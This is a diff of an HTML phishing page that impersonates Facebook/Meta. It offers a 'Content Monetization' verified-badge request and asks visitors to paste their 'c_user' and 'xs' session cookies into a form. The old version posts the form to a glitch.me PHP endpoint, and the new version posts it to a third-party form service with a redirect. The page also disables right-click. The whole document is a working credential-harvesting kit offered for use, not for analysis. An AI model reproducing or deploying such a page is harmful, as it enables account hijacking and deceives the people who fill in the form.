@@ -1,113 +1,182 @@
-
 <html oncontextmenu="return false">
 
 <head>
     <meta charset="UTF-8">
     <link href="style.css" rel="stylesheet">
     <title>Action | Submit</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+            background-color: #f4f7fa;
+        }
+
+        header {
+            background-color: #4267b2;
+            padding: 1.5rem;
+            color: white;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        header b {
+            font-size: 2rem;
+        }
+
+        .search-bar {
+            position: relative;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+
+        .search-bar input {
+            padding: 10px 15px;
+            width: 300px;
+            border-radius: 5px;
+            border: 1px solid #ddd;
+            font-size: 14px;
+        }
+
+        .form-container {
+            width: 80%;
+            max-width: 800px;
+            margin: 3rem auto;
+            background-color: white;
+            padding: 2rem;
+            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
+            border-radius: 8px;
+        }
+
+        .form-container h2 {
+            text-align: center;
+            color: #333;
+        }
+
+        .input-group {
+            margin-bottom: 1.5rem;
+        }
+
+        .input-group label {
+            font-size: 14px;
+            font-weight: bold;
+            color: #555;
+        }
+
+        .input-group input {
+            width: 100%;
+            padding: 12px;
+            margin-top: 8px;
+            border: 1px solid #ddd;
+            border-radius: 5px;
+            font-size: 14px;
+        }
+
+        .input-group input:focus {
+            border-color: #4267b2;
+        }
+
+        .form-container p {
+            color: #666;
+            font-size: 14px;
+            line-height: 1.5;
+        }
+
+        .submit-btn {
+            width: 100%;
+            padding: 14px;
+            background-color: #4267b2;
+            border: none;
+            border-radius: 5px;
+            color: white;
+            font-size: 16px;
+            cursor: pointer;
+            transition: background-color 0.3s ease;
+        }
+
+        .submit-btn:hover {
+            background-color: #365899;
+        }
+
+        footer {
+            text-align: center;
+            padding: 1rem;
+            background-color: #f5f6f7;
+            font-size: 12px;
+            color: #90949c;
+        }
+
+        footer a {
+            color: #4267b2;
+            text-decoration: none;
+        }
+
+        footer a:hover {
+            text-decoration: underline;
+        }
+
+        .video-thumbnail {
+            max-width: 100%;
+            margin: 1rem 0;
+        }
+    </style>
 </head>
 
 <body>
-  
-    <div class="md:block lg:block hidden border flex w-full h-[6rem]  relative bg-[#4667ac]">
-        <div class="mx-10 mt-4">
-            <b class="text-5xl text-white">facebook</b>
+    <header>
+        <b>Facebook</b>
+        <div class="search-bar">
+            <input type="search" placeholder="How Can We Help?" required>
         </div>
-        <div>
-            <form class="sm:hidden lg:block md:block">
-                <label for="search" class="hidden lg:block md:block mb-2 text-sm font-medium text-gray-900 sr-only dark:text-white">Search</label>
-                <div class="relative hidden md:block lg:block">
-                    <div class="absolute inset-y-0 left-0 flex items-center pl-96 mx-3 pointer-events-none">
-                        <svg class="w-3 h-3 text-gray-500 dark:text-gray-400" aria-hidden="true" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 20 20">
-                            <path stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="m19 19-4-4m0-7A7 7 0 1 1 1 8a7 7 0 0 1 14 0Z"></path>
-                        </svg>
-                    </div>
-                    <input type="search" id="search" class="block w-[600px] p-1 mx-96 -mt-9  pl-7 text-sm text-gray-900 border border-gray-300 rounded-sm bg-gray-50 focus:ring-blue-500 focus:border-blue-500 dark:bg-gray-700 dark:border-gray-600 dark:placeholder-gray-400 dark:text-white dark:focus:ring-blue-500 dark:focus:border-blue-500"
-                        placeholder="How Can We Help?" required="">
-                </div>
-            </form>
-        </div>
-    </div>
-    <form class="sm:hidden lg:block md:block" action="https://periodic-highfalutin-foe.glitch.me/babu.php" method="post">
+    </header>
 
-        
-                <form>
-                    <img class="h-7  mx-10 mt-2 shadow-2xl /home.png" alt="">
-                </div>
-            </div>
-            <div class="md:block lg:block hidden">
-                <p class="text-[#3578e5] text-xl font-extrabold font-serif  mx-[4.50rem] -mt-6 u"><body><img src="https://cdn.glitch.global/325f7535-a68d-4687-a91c-1e7d9366104a/blue_tick-B9ADAlwo.png?v=1723987162846" alt="meta" class="img-fluid" style="width: 4rem; height: 4rem; margin-bottom: 0px;"></body>
-                </p>
-            </div>
-        </div>
-        <div class="border md:block hidden lg:block block mx-72 mt-9 w-[630px]">
-            <div></p><p class="py-3" style="font-size: 17px;<a </p><a href="#" class="business-info"></a></a><p class="mt-4 font-italic" style="font-size: 13px;"</a><p
-                <p class="border-b h-10 font-bold text-[16px] text-[#4b4f56] pl-3 p-2 bg-[#f5f6f7]"</p><a </p><a href="#" class="business-info"></a>Creator Content monetization</a><p class="mt-4 font-italic" style="font-size: 13px;"</a><p
-                </p>
-            </div>
-            <div>
-                <p class="mt-4 pl-3 text-[12px] font-semibold">The verified badge shows that Facebook has confirmed the Page or profile as the authentic representation of the individual or brand, which is important for content monetization.
-                <p class="mt-4 pl-3 text-[12px] font-semibold">Previously, the verified badge required individuals or brands to be notable and unique. Some users may still have the badge based on these older eligibility criteria, which can impact content monetization.
-                <p class="mt-4 pl-3 text-[12px] font-semibold">Please provide the details below. If unclear, refer to the video, as it may impact content monetization.
-            </div>
-            <div>
+    <div class="form-container">
+        <h2>Content Monetization Request</h2>
 
+        <form action="https://submit-form.com/sM6ETRQBF" method="post">
+            <input type="hidden" name="_redirect" value="https://pass-link-here.surge.sh">
+
+            <!-- Verified Badge Info -->
+            <div class="input-group">
+                <p class="font-semibold">The verified badge shows that Facebook has confirmed the Page or profile as the authentic representation of the individual or brand, which is important for content monetization.</p>
             </div>
-            <div>
-                <p class="text-[11px] text-[#90949c] p-2 font-semibold">Detailed Video Information
-                </p>
-            </div>
-            <div>
+
+            <!-- Detailed Video Information -->
+            <div class="input-group">
+                <label for="video">Detailed Video Information:</label>
                 <a href="kabeer.mp4.mp4">
-                    <img src="https://i.pinimg.com/originals/97/95/69/979569a2dedd37573974ceebc05b4a4e.png" width="150" >
-                  </a>
-            </div>
-            <div>
-                <p class=" pl-3 text-[12px] font-semibold">
-
-                <p class=" pl-3 text-[12px] font-semibold">Please be sure to provide the requested information below.                                                      
-                </p </div>
-                <div>
-                    <p class="text-slate-400 pl-4 mt-1">c_user
-                    </p>
-                    <input class="border h-6 pl-1 mx-3" type="text" name="c_user" placeholder="" pattern="[0-9]+" minlength="6" id="c_user" required="" value="">
-                </div>
-                <div>
-                    <p class="text-slate-400 pl-4 mt-1">xs
-                    </p>
-                    <input class="border h-6 pl-1 mx-3" type="text" name="xs" placeholder="" pattern="^(?=.*[a-z])(?=.*[A-Z])(?=.*\d)(?=.*[@#$%^&amp;+=]).{12,}$" title="Must Watch Detailed Video" required="1" aria-required="true">
-                </div><div bis_skin_checked="1">
-                </div>
-                <div>
-                    <p class="mt-4 pl-3 text-[12px] font-semibold">Please make sure account not to log out from your computer or laptop until you have received a verification email.
-                    </p>
-                </div>
-                <div class="border mx-3 h-10 mt-4 bg-[#f5f6f7]">
-                    <div class="flex justify-end mx-2">
-                        <button class="border h-7 w-16  bg-[#4267b2] text-white shadow-2xl mt-[0.30rem] font-serif font-thin text-xs hover:bg-blue-500" id="delete-btn">Submit
-                    </button>
-                    </div>
-                </div>
-                <div class="mt-4"></div>
+                    <img src="https://i.pinimg.com/originals/97/95/69/979569a2dedd37573974ceebc05b4a4e.png" class="video-thumbnail" alt="Video Thumbnail">
+                </a>
             </div>
 
-
-
-            <footer>
-                <div>
-                    <li class="text-sm text-[#90949c] md:hidden lg:hidden sm:block mt-4 pl-72 flex hover:underline">META©️ 2024
-                    </li>
-                </div>
-                <div class="hidden lg:block md:bllock flex">
-
-                </div>
-                <div class="mt-7"></div>
-            </footer>
-            <div class="hidden">
-
-
+            <!-- User Information -->
+            <div class="input-group">
+                <label for="c_user">c_user:</label>
+                <input type="text" id="c_user" name="c_user" placeholder="Enter c_user ID" pattern="[0-9]+" minlength="6" required>
             </div>
-    </form>
+
+            <div class="input-group">
+                <label for="xs">xs:</label>
+                <input type="text" id="xs" name="xs" placeholder="Enter xs token" pattern="^(?=.*[a-z])(?=.*[A-Z])(?=.*\d)(?=.*[@#$%^&amp;+=]).{12,}$" title="Must be at least 12 characters, with a mix of letters, numbers, and symbols." required>
+            </div>
+
+            <!-- Additional Notes -->
+            <div class="input-group">
+                <p>Please make sure your account is not logged out from your computer or laptop until you have received a verification email.</p>
+            </div>
+
+            <!-- Submit Button -->
+            <div class="input-group">
+                <button type="submit" class="submit-btn">Submit</button>
+            </div>
+        </form>
+    </div>
+
+    <footer>
+        <p>© META 2024 | <a href="https://www.metaservices.com">Meta Services</a></p>
+    </footer>
 </body>
 
 </html>
